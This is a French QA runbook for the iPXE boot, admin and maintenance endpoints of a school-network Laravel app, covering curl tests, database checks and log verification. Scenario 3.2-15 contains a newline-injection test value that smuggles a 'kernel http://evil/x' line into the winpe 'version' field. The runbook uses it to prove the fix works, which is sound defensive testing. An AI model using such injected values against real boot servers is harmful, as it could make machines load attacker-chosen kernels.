# QA manuel — Domaine iPXE — Boot réseau & Déploiement OS

> Runbook E2E pour les stories du domaine iPXE (Epic 3). Append-only :
> chaque story ajoute une section avec ses scénarios numérotés stables.

**Pré-requis** :

- VM accessible : `ssh -i ~/.ssh/id_se4fs_vm root@192.168.122.50`
- Migrations à jour : `cd /var/www/sambaedu-reload && php artisan migrate`
- Composer à jour : `composer install --no-dev --optimize-autoloader`
- Apache (ou nginx) actif : `systemctl is-active apache2`
- Cache reset après deploy : `php artisan config:cache && php artisan route:cache && php artisan view:cache`
- Channel log `ipxe` créé : `ls -la storage/logs/ipxe/` (créé automatiquement
  au premier boot par `IpxeServiceProvider`)

---

## Story 3.1 — iPXE Service Core

**Date livraison** : 2026-05-19
**Migrations à appliquer** : aucune (D12 — réutilisation `MachineBootLog` existant)
**Permissions requises** : aucune (un firmware iPXE n'a pas de credentials —
sécurité = `auth.v1.lan-only` réutilisé de 16.11)

### Section 1 — Endpoint natif `/ipxe/boot` (handshake + résolution)

#### Scénario 3.1-1 — Premier appel iPXE (handshake, sans paramètres)

```bash
curl -sS http://192.168.122.50/ipxe/boot
```

**Attendu** :

- Status 200
- Header `Content-Type: text/plain; charset=utf-8`
- Header `Cache-Control: no-store`
- Header `X-Robots-Tag: noindex`
- Body commence par :
  ```
  #!ipxe
  params
  param mac ${net0/mac}
  param uuid ${uuid}
  param product ${product}
  chain --replace --autofree boot##params
   || sleep 10
  ```

**Vérification log** :

```bash
tail -n 5 storage/logs/ipxe/ipxe-$(date +%F).log
# Attendu : ligne `ipxe.boot.handshake` avec context {ip, user_agent}
```

#### Scénario 3.1-2 — Appel iPXE avec MAC connue (poste seed via tinker)

```bash
# 1. Seed une Workstation de test
php artisan tinker
> App\Models\Workstation::create([
    'name' => 'PC-TEST-101',
    'uuid' => '12345678-1234-1234-1234-123456789abc',
    'mac' => 'aa:bb:cc:dd:ee:ff',
    'status' => 'active',
  ]);
> exit

# 2. Appel iPXE simulé
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc&product=OptiPlex 3050'
```

**Attendu** :

- Status 200
- Body contient `PC-TEST-101` dans le titre du menu
- Body contient `item --key 1 login`
- Body contient `item --key 3 default`
- Body contient `:default` puis `iseq ${platform} efi`

#### Scénario 3.1-3 — Appel iPXE avec UUID connu (sans MAC matchante)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=00:00:00:00:00:00&uuid=12345678-1234-1234-1234-123456789abc&product=OptiPlex 3050'
```

**Attendu** :

- Status 200, body contient `PC-TEST-101` — la priorité UUID a fonctionné
  malgré MAC `00:00:00:00:00:00` non-matchante.

#### Scénario 3.1-4 — Appel iPXE avec MAC+UUID inconnus (poste inconnu)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=99:99:99:99:99:99&uuid=99999999-9999-9999-9999-999999999999&product=Unknown'
```

**Attendu** :

- Status 200
- Body contient `item --key 0 exit (0) Quitter iPXE et booter le disque dur`
- Body NE contient PAS `item --key 1 login` (= menu default, poste inconnu)
- Log channel `ipxe` : event `ipxe.boot.unknown_workstation`

### Section 2 — Sécurité LAN-only

#### Scénario 3.1-5 — Rejet IP publique (test depuis 8.8.8.8 simulé)

> **Fix review #9** — le précédent snippet `tinker` ne créait qu'un objet
> Request sans invoquer le middleware, donc ne démontrait rien. La validation
> automatisée fiable passe par le test Feature dédié.

**Méthode canonique (recommandée)** — exécuter le test Feature qui couvre
l'intégralité du flow middleware :

```bash
# Sur la VM (ou en local si vendor/ présent) :
php artisan test tests/Feature/Ipxe/IpxeEnsureLanIpTest.php
```

Le test simule des appels depuis IPs publiques (`8.8.8.8`, `1.2.3.4`) et
vérifie la réponse 403 + le code d'erreur. C'est la seule méthode fiable —
le middleware Laravel `auth.v1.lan-only` ne s'exécute que dans le pipeline
HTTP complet.

**Méthode alternative en prod (smoke réel)** — depuis une machine externe au
LAN scolaire (e.g. un VPS, un poste 4G mobile) :

```bash
curl -sS -i -X POST https://$SE4FS_HOST/ipxe/boot -d 'mac=aa:bb:cc:dd:ee:ff'
```

**Attendu** :

- Réponse 403 + JSON `{success:false, error:"forbidden", code:"bootstrap.not_lan"}`
- Log channel `auth-v1` : event `auth.bootstrap.lan_blocked`

### Section 3 — Non-régression catchall legacy

#### Scénario 3.1-6 — `/ipxe/admin.php` reste servi par le catchall

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/admin.php
# Attendu : 200 (ou 302 vers login) — la page legacy est servie
```

**Vérification DB** :

```bash
sudo -u postgres psql -d sambaedu -c "SELECT id, method, path FROM legacy_catchall_logs WHERE path LIKE '%ipxe/admin.php%' ORDER BY id DESC LIMIT 1;"
# Attendu : row récente
```

#### Scénario 3.1-7 — `/ipxe/boot` ne génère PAS de row legacy_catchall_logs

```bash
curl -sS http://192.168.122.50/ipxe/boot > /dev/null
sudo -u postgres psql -d sambaedu -c "SELECT count(*) FROM legacy_catchall_logs WHERE path LIKE '%ipxe/boot%' AND created_at > now() - interval '1 minute';"
# Attendu : 0 — la route native court-circuite le catchall
```

### Section 4 — Persistance MachineBootLog

#### Scénario 3.1-8 — `MachineBootLog` peuplé à chaque call (sauf handshake)

```bash
sudo -u postgres psql -d sambaedu -c "
SELECT id, workstation_id, machine_name, action, initiated_by, success, started_at
FROM machine_boot_logs
WHERE action = 'ipxe_boot'
ORDER BY id DESC
LIMIT 5;
"
```

**Attendu** : rows avec
- `action='ipxe_boot'`
- `initiated_by='ipxe'`
- `success=true`
- `workstation_id` non-null pour poste connu, null pour inconnu
- `machine_name` lowercased pour poste connu (ex. `pc-test-101`), `unknown:<ip>`
  pour poste inconnu

### Section 5 — Smoke poste réel (optionnel — action Henri)

#### Scénario 3.1-9 — Boot PXE depuis un poste de test

1. Brancher un poste de test sur le LAN scolaire (192.168.x.y).
2. Configurer en BIOS : PXE boot prioritaire.
3. Rebooter le poste.

**Attendu** :

- Le firmware iPXE affiche le menu rendu par `/ipxe/boot`.
- Si le poste est seedé en base avec sa MAC/UUID → menu `known` (3 items :
  login, default, action conditionnel).
- Sinon → menu `default` (1 seul item : exit/boot disk).
- Choisir option 0 (Quitter iPXE et booter le disque dur) → boot disque
  local normal.
- Une row `MachineBootLog` `action='ipxe_boot'` est créée.

---

## Story 3.2 — Boot et Menu Admin iPXE

**Date livraison** : 2026-05-19
**Migrations à appliquer** : aucune (D12 — extension valeurs `MachineBootLog.action` sans CHECK)
**Permissions requises** : aucune (parité 3.1 — `auth.v1.lan-only` seul)

### Section 6 — Endpoint natif `/ipxe/admin`

#### Scénario 3.2-1 — Handshake `/ipxe/admin` (sans params)

```bash
curl -sS http://192.168.122.50/ipxe/admin
```

**Attendu** :

- Status 200
- Header `Content-Type: text/plain; charset=utf-8`
- Body commence par :
  ```
  #!ipxe
  params
  param mac ${net0/mac}
  param uuid ${uuid}
  param product ${product}
  chain --replace --autofree admin##params
   || sleep 10
  ```

**Vérification log** :

```bash
tail -n 1 storage/logs/ipxe/ipxe-$(date +%F).log
```
Attendu : event `ipxe.admin.handshake` avec `ip=<ton ip>`.

#### Scénario 3.2-2 — Menu admin pour poste connu

Pré-requis : créer la fixture via tinker.

```bash
php artisan tinker --execute="App\Models\Workstation::create(['name'=>'pc-test-32-1','mac'=>'aa:bb:cc:dd:ee:01','uuid'=>'12345678-1234-1234-1234-aaaaaaaaaaaa','status'=>'active']);"
```

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&product=OptiPlex 3050'
```

**Attendu** :

- Status 200
- Body contient :
  - `menu Preboot eXecution Environment pour pc-test-32-1`
  - `item --key m maintenance (m) Outils de maintenance`
  - `item --key r retour`
  - `item --key x exit`
  - `chain --replace --autofree http://192.168.122.50/ipxe/maintenance##params`

#### Scénario 3.2-3 — Menu admin pour poste inconnu

```bash
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=00:00:00:00:00:00&uuid=00000000-0000-0000-0000-000000000000'
```

**Attendu** :

- Status 200
- Body contient `Poste non enregistre`, `Story 3.3` (placeholder enrollment).
- **Absence** d'item `item --key m maintenance`.
- Items présents : `item --key x exit` + `item --key r retour`.

### Section 7 — Endpoint natif `/ipxe/maintenance`

#### Scénario 3.2-4 — Handshake `/ipxe/maintenance`

```bash
curl -sS http://192.168.122.50/ipxe/maintenance
```

**Attendu** : body contient `chain --replace --autofree maintenance##params`.

#### Scénario 3.2-5 — Menu maintenance complet

```bash
curl -sS -X POST http://192.168.122.50/ipxe/maintenance \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** :

- Status 200
- Body contient :
  - `item --key c rescuecd (c) Utilisation de SystemRescueCD`
  - `item --key w winpe (w) Reparation Windows (WinPE)`
  - `item --key f factory_reset (f) ATTENTION - Restauration usine`
  - `item --key s shell`
  - `item --key r retour` (chain vers `/ipxe/admin`)
  - `item --key x exit`

### Section 8 — Endpoint natif `/ipxe/action/{action}` + whitelist

#### Scénario 3.2-6 — Action `rescuecd` (port natif `actions/rescuecd.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/rescuecd \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** :

- Status 200
- Body contient :
  - `kernel http://192.168.122.50/ipxe/sysresccd/boot/x86_64/vmlinuz`
  - `archisobasedir=sysresccd`
  - `rootpass=...` (valeur de `config('sambaedu.se4install_passwd')`)
  - 3 `initrd --name` (intel_ucode, amd_ucode, initram.igz)
  - Se termine par `boot\n`.

#### Scénario 3.2-7 — Action `winpe` (port natif `actions/winpe.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** : body contient `kernel Win10/wimboot`, 2 blocs `params`, 6 lignes `initrd --name` (winpeshl.ini, install.bat, diskpart.txt, BCD, boot.sdi, boot.wim), 2 occurrences de `iseq ${platform} efi && param bios uefi || param bios legacy`.

#### Scénario 3.2-8 — Action `factory_reset` (port natif `clz_rest_sda2_sur_sda1.php`)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/action/factory_reset \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** : body contient `kernel http://192.168.122.50/ipxe/clonezilla/vmlinuz`, `ocs_prerun="mount -t auto /dev/sda2`, `ocs_live_run="ocs-sr -e1 auto -e2 -r -j2 -p reboot restoreparts savesda1 sda1"`, `fetch=http://192.168.122.50/ipxe/clonezilla/filesystem.squashfs`.

#### Scénario 3.2-9 — Action inconnue → 404 + log warning

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/action/install_macos
```

**Attendu** : `404`.

```bash
tail -n 1 storage/logs/ipxe/ipxe-$(date +%F).log
```
Attendu : event `ipxe.action.unknown_action` avec `action_requested='install_macos'`.

### Section 9 — Non-régression catchall + MachineBootLog

#### Scénario 3.2-10 — `/ipxe/admin.php` continue d'être servi par le catchall legacy

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/admin.php
```

**Attendu** : 200 (servi par le catchall — discrimination par extension `.php`).

```bash
sudo -u postgres psql -d sambaedu -c "SELECT path FROM legacy_catchall_logs WHERE path LIKE '%ipxe/admin.php%' ORDER BY id DESC LIMIT 3;"
```
Attendu : au moins une row récente.

#### Scénario 3.2-11 — Bascule menu `known` 3.1 → admin natif 3.2

```bash
curl -sS -X POST http://192.168.122.50/ipxe/boot \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&product=OptiPlex 3050'
```

**Attendu** : body contient `chain --replace --autofree http://192.168.122.50/ipxe/admin##params` (sans `.php`).

#### Scénario 3.2-12 — MachineBootLog peuplé pour les 3 endpoints

```bash
sudo -u postgres psql -d sambaedu -c "
SELECT action, initiated_by, machine_name, started_at
FROM machine_boot_logs
WHERE action IN ('ipxe_admin', 'ipxe_maintenance', 'ipxe_action')
ORDER BY id DESC LIMIT 10;
"
```

**Attendu** : rows avec actions `ipxe_admin`/`ipxe_maintenance`/`ipxe_action`. Pour `ipxe_action`, `initiated_by` au format `ipxe:rescuecd`, `ipxe:winpe` ou `ipxe:factory_reset`.

### Section 10 — Smoke poste réel (optionnel — action Henri)

#### Scénario 3.2-13 — Boot PXE → menu admin natif → rescue

1. Brancher un poste de test sur le LAN.
2. Configurer PXE boot prioritaire en BIOS.
3. Rebooter le poste → menu `known` iPXE.
4. Choisir option `1` (login) → menu admin natif.
5. Choisir `m` (maintenance) → menu maintenance natif.
6. Choisir `c` (rescuecd) → boot SystemRescueCD réel.

**⚠️ NE PAS** tester `factory_reset` sur un poste de prod sans backup (destructif).

Vérifier :
- Logs `storage/logs/ipxe/ipxe-$(date +%F).log` : événements `ipxe.admin.menu_rendered`, `ipxe.maintenance.menu_rendered`, `ipxe.action.dispatched`.
- 3 rows MachineBootLog correspondantes.

---

### Section 11 — Post-correctifs & non-régressions 3.2 (review 2026-05-19)

**Contexte** : 8 corrections appliquées suite à la code-review adversariale (cf.
`_bmad-output/codeReviews/3-2.md`). 3 incidents critiques corrigés à
re-tester explicitement sur la VM.

#### Tableau des incidents couverts

| # | Incident corrigé | Sévérité | Scénario QA |
|---|---|---|---|
| #1 | Bloc `params` (mac/uuid) absent dans `admin.blade.php` et `maintenance.blade.php` → MachineBootLog audit cassé sur chains internes (`unknown:<ip>`) | 🔴 | **Scénario 3.2-14** |
| #2 | `$version` winpe non sanitisé — newline injection iPXE (`version=Win11\nkernel http://evil/x`) | 🔴 | **Scénario 3.2-15** |
| #3 (Q1 Henri) | `factory_reset` sans log warning dédié — pas d'alerte SIEM possible sur action destructive | 🟠 | **Scénario 3.2-16** |

#### Scénario 3.2-14 — Bloc `params` injecté dans menus admin/maintenance (fix #1)

**Objectif** : vérifier que la navigation chainée admin → maintenance →
action propage bien `mac`/`uuid` (parité iso-legacy `admin.php:69-74` +
`maintenance.php:19-22`).

```bash
# 1. Curl menu admin connu, vérifier présence bloc params en tête.
curl -sS -X POST http://192.168.122.50/ipxe/admin \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc' \
  | head -10

# Attendu :
# #!ipxe
# params
# param mac aa:bb:cc:dd:ee:ff
# param uuid 12345678-1234-1234-1234-123456789abc
# console --x 1024 --y 768 --picture png/ipxe-se4.png
# :menu
# ...

# 2. Idem menu maintenance.
curl -sS -X POST http://192.168.122.50/ipxe/maintenance \
  -d 'mac=aa:bb:cc:dd:ee:ff&uuid=12345678-1234-1234-1234-123456789abc' \
  | head -10

# 3. Vérifier MachineBootLog : machine_name doit être celui du poste connu
#    (pas 'unknown:<ip>') après une chain interne admin → maintenance →
#    action depuis un poste réel ou simulé via curl séquentiel.
ssh /vm
psql sambaedu_reload -c "SELECT machine_name, action, initiated_by FROM machine_boot_logs WHERE created_at > NOW() - INTERVAL '5 minutes' ORDER BY id DESC LIMIT 10;"
# Attendu : machine_name = nom poste (PC-XXX), pas 'unknown:<ip>' tant que mac/uuid sont propagés via params.
```

**Critères d'acceptation** :
- Body admin commence par `#!ipxe\nparams\nparam mac <mac>\nparam uuid <uuid>\n`.
- Body maintenance idem.
- Aucune row MachineBootLog avec `machine_name='unknown:<ip>'` pour un poste qui était `known` au handshake initial.

#### Scénario 3.2-15 — Whitelist `$version` winpe (fix #2 / Q2 Henri)

**Objectif** : prouver qu'une tentative d'injection iPXE via newline dans
`version` POST est rejetée (FormRequest 422 OU fallback Win11 — défense en
profondeur).

```bash
# 1. POST winpe avec injection newline → attendre 422 (FormRequest Rule::in)
#    OU fallback Win11 (defense in depth resolver).
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:fe&uuid=eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee&version=Win11%0Akernel%20http://evil/x' \
  -o /tmp/winpe.out
cat /tmp/winpe.out

# Attendu (cas 1 — FormRequest 422 sans `Accept: application/json`) :
#   redirect 302 (form-encoded sans Accept JSON) OU
#   200 avec body fallback Win11 pur.

# Vérification CRITIQUE :
grep -q 'kernel http://evil' /tmp/winpe.out && echo "❌ INJECTION REUSSIE — BUG" || echo "✅ Pas d'injection"
grep -c 'Win11' /tmp/winpe.out  # Doit retourner ≥ 4 (BCD + boot.wim + param version + initrd).
grep -c 'http://evil' /tmp/winpe.out  # Doit retourner 0.

# 2. POST winpe avec version=Win10 (whitelist OK) → 200 body propage Win10.
curl -sS -X POST http://192.168.122.50/ipxe/action/winpe \
  -d 'mac=aa:bb:cc:dd:ee:fe&uuid=eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee&version=Win10' \
  | grep -E '(param version|initrd --name BCD|initrd --name boot.wim)'
# Attendu : 3 lignes contenant `Win10` pur.
```

**Critères d'acceptation** :
- `grep 'kernel http://evil' /tmp/winpe.out` retourne 0 occurrence.
- Body fallback contient `Win11` (config `DEFAULT_WIN_VERSION`).
- Whitelist Win10 propagée correctement.

#### Scénario 3.2-16 — Log warning factory_reset (fix #3 / Q1 Henri)

**Objectif** : vérifier que toute action `factory_reset` émet un event
warning dédié grep-able pour SIEM/alerting.

```bash
# 1. Déclencher factory_reset sur un poste de test (préférablement sans
#    disque ou avec backup — l'event est émis avant l'exécution Clonezilla).
ssh /vm
tail -F /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log &
TAIL_PID=$!

curl -sS -X POST http://192.168.122.50/ipxe/action/factory_reset \
  -d 'mac=aa:bb:cc:dd:ee:fa&uuid=fafafafa-fafa-fafa-fafa-fafafafafafa'

sleep 1
kill $TAIL_PID

# 2. Grep le warning dans le log.
grep 'ipxe.action.factory_reset_dispatched' /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log

# Attendu : ≥ 1 ligne niveau `warning` avec mac_prefix/uuid_prefix tronqués
#           (6/8 chars iso AC7.3), ip, workstation_id.
# Exemple :
#   [2026-05-19 14:32:11] ipxe.WARNING: ipxe.action.factory_reset_dispatched
#     {"action_type":"ipxe.action.factory_reset_dispatched","ip":"192.168.1.42",
#      "mac_prefix":"aa:bb:","uuid_prefix":"fafafafa","workstation_id":42}

# 3. Vérifier qu'une action NON-factory_reset NE DÉCLENCHE PAS le warning.
curl -sS -X POST http://192.168.122.50/ipxe/action/rescuecd \
  -d 'mac=aa:bb:cc:dd:ee:fb&uuid=fbfbfbfb-fbfb-fbfb-fbfb-fbfbfbfbfbfb'

# Le grep ne doit pas trouver de NOUVELLE ligne factory_reset_dispatched.
grep -c 'ipxe.action.factory_reset_dispatched' /var/www/sambaedu-reload/storage/logs/ipxe/ipxe-$(date +%F).log
# Attendu : compteur stable (uniquement les factory_reset précédents).
```

**Critères d'acceptation** :
- Au moins 1 event `ipxe.action.factory_reset_dispatched` niveau `warning` dans le log channel `ipxe` après chaque dispatch factory_reset.
- Préfixes PII (mac/uuid) tronqués 6/8 chars (anti-fuite AC7.3).
- Aucun event sur rescuecd ou winpe.

---

## Checklist rapide (avant merge `main` → prod)

- [ ] Scénario 3.1-1 (handshake) : `curl /ipxe/boot` → préambule iPXE OK
- [ ] Scénario 3.1-2 (MAC connue) : menu known affiché
- [ ] Scénario 3.1-3 (UUID priorité) : matching prio UUID OK
- [ ] Scénario 3.1-4 (poste inconnu) : menu default minimal
- [ ] Scénario 3.1-5 (LAN restriction) : 403 hors LAN
- [ ] Scénario 3.1-6 (non-régression `/ipxe/admin.php`) : catchall répond
- [ ] Scénario 3.1-7 (court-circuit catchall) : pas de row legacy_catchall_logs pour /ipxe/boot
- [ ] Scénario 3.1-8 (MachineBootLog peuplé) : rows `action='ipxe_boot'`
- [ ] Scénario 3.1-9 (smoke poste réel) — optionnel, valide en pré-prod
- [ ] Scénario 3.2-1 (handshake /ipxe/admin) : préambule + chain admin##params
- [ ] Scénario 3.2-2 (menu admin poste connu) : item maintenance + exit + retour
- [ ] Scénario 3.2-3 (menu admin poste inconnu) : message neutre + pas d'item maintenance
- [ ] Scénario 3.2-4 (handshake /ipxe/maintenance)
- [ ] Scénario 3.2-5 (menu maintenance) : rescuecd + winpe + factory_reset
- [ ] Scénario 3.2-6 (action rescuecd) : kernel sysresccd + 3 initrds
- [ ] Scénario 3.2-7 (action winpe) : kernel wimboot + initrds Win10
- [ ] Scénario 3.2-8 (action factory_reset) : kernel clonezilla + restoreparts
- [ ] Scénario 3.2-9 (action inconnue) : 404 + log warning
- [ ] Scénario 3.2-10 (catchall legacy /ipxe/admin.php) : 200 servi par catchall
- [ ] Scénario 3.2-11 (bascule known→admin natif) : chain sans `.php`
- [ ] Scénario 3.2-12 (MachineBootLog 3.2) : 3 actions persistées
- [ ] Scénario 3.2-13 (smoke poste réel) — optionnel, pré-prod uniquement
- [ ] Scénario 3.2-14 (post-correctif #1 — params block admin+maintenance) : `params\nparam mac\nparam uuid` en tête, pas de row `unknown:<ip>` après chain
- [ ] Scénario 3.2-15 (post-correctif #2 — whitelist version winpe) : injection `version=Win11\nkernel http://evil` → fallback Win11 pur
- [ ] Scénario 3.2-16 (post-correctif #3 — warning factory_reset) : event `ipxe.action.factory_reset_dispatched` niveau warning

> Smoke automatisable : voir Story 3.1 et 3.2 § "Smoke test à exécuter quand VM up"
> dans `_bmad-output/implementation-artifacts/3-1-ipxe-service-core.md`.
